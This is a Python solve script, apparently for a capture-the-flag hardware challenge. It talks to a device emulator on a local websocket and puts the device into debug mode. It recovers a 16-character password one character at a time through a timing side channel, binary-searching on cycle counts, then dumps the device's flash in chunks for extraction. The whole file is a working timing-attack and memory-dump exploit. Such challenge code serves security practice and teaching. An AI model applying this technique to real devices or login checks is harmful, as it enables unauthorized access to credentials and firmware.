import asyncio
import websockets
import json
import base64
import struct

async def connect(url):
    return await websockets.connect(url)

async def send_data(socket, data):
    await socket.send(json.dumps({
        'data' : base64.b64encode(data).decode('ascii')
    }))

async def receive_data(socket):
    response = await socket.recv()
    message = json.loads(response)
    return base64.b64decode(message['data']), message['cycles']

async def main():
    socket = await connect('ws://localhost:10004')
    # Put us into debug mode.
    await send_data(socket, b'\x55\x00\xC1\x00')
    data, cycles = await receive_data(socket)

    # Initialize communications.
    await send_data(socket, b'\x33\x01\x00\x03')
    data, cycles = await receive_data(socket)
    
    # Set the frequency.
    await send_data(socket, b'\x33\x05\x00\x05\x00\x12\x7A\x00')
    data, cycles = await receive_data(socket)

    # Leak the password.
    leaked = False
    id_bytes = [ord('A') for index in range(16)]
    test_point = 0
    char_attempt = 0
    previous_cycle_count = cycles
    low, mid, high = ord('A'), 0, ord('Z')
    cycle_correction_base = 0
    while not leaked:
        if test_point >= 16:
            leaked = True
            continue

        mid = low + (high - low) // 2
        # print(f'midpoint is {mid}')
        print(f'as character, {chr(mid)}')
        id_bytes[test_point] = mid
        char_attempt += 1

        # Send our current password, get information back.
        await send_data(socket, b'\x33\x11\x00\x34' + bytes(id_bytes))
        data, cycles = await receive_data(socket)
        print(f'Got back {cycles}')

        # There's three thresholds that will help us do a binary search.
        # Byte is < correct one: ~250 cycles.
        # Byte is > correct one: ~500 cycles.
        # Byte is = correct one: ~1000 cycles.
        # print(f'Previous was {previous_cycle_count}')
        # print(f'New is {cycles}')
        cycle_difference = cycles - previous_cycle_count - cycle_correction_base
        previous_cycle_count = cycles

        # If the cycle difference is close to 250 (within 4 to 6 cycles), less than.
        if 250 <= cycle_difference <= 256:
            low = mid + 1
            continue

        # If close to 500, greater than.
        elif 500 <= cycle_difference <= 506:
            high = mid - 1 
            continue

        # If close to 1000, equal
        else:
            print(f'Character at point {test_point} is {chr(id_bytes[test_point])}; took {char_attempt} tries')
            test_point += 1
            # Reset search params
            low, high = ord('A'), ord('Z')
            char_attempt = 0
            cycle_correction_base += 1000

    print(f'Password is {bytes(id_bytes)}')

    # Now lets read the flash in 0x400 chunks
    address = 0
    with open('solve_dump.bin', 'wb') as OUT:
        while address < 0xEDC00:
            await send_data(socket, b'\x33\x05\x00\x69' + struct.pack('<I', address))
            data, cycles = await receive_data(socket)
            OUT.write(data[5:])
            address += 0x400

    # After the chunks have been read, run binwalk -e to extract the tar archives out of it.
    # Then, check frames.xz.
    return 0

if __name__ == "__main__":
    asyncio.run(main())